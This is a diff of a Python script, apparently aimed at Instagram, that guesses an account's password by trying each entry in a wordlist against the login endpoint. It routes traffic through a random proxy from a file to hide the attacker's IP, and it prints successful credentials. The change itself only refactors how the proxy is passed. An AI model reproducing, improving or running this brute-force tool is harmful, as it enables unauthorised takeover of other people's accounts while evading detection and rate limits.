@@ -16,6 +16,7 @@ else:
 	exit()
 
 
+myProxy = ''
 
 
 def userExists(username):
@@ -29,10 +30,12 @@ def userExists(username):
 		return {'username':username,'id':fUserID}
 
 
-def Login(username,password, proxy):
+def Login(username,password):
+	global myProxy
+
 	sess = requests.Session()
 
-	sess.proxies = { "http": proxy, "https": proxy }
+	sess.proxies = { "http": myProxy, "https": myProxy }
 
 	sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
 	sess.headers.update({
@@ -75,14 +78,6 @@ def Login(username,password, proxy):
 
 ###Start###
 
-def RandomProxy():
-	myProxy = random.choice(open('proxy.txt').read().splitlines())
-	#r = requests.get('http://myexternalip.com/raw') 
-	#print (''r.text)
-	#r = requests.get('http://myexternalip.com/raw', proxies={ "http": myProxy, "https": myProxy }) 
-	#print (r.text)
-	return myProxy
-
 
 
 username = str(input('Please enter a username: '))
@@ -99,14 +94,13 @@ delayLoop = int(input('Please add delay between the passwords (in seconds): '))
 
 UsePorxy = input('Do you want to use proxy (y/n): ')
 if (UsePorxy == 'y'):
-	myProxy = RandomProxy()
+	myProxy = random.choice(open('proxy.txt').read().splitlines())
 	print ('Your public ip: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": myProxy, "https": myProxy }).text)
-else:
-	myProxy = ''
+
 
 for i in range(len(passwords)):
 	password = passwords[i]
-	sess = Login(username, password, myProxy)
+	sess = Login(username, password)
 	if (sess):
 		print ('Login success %s' % [username,password])
 
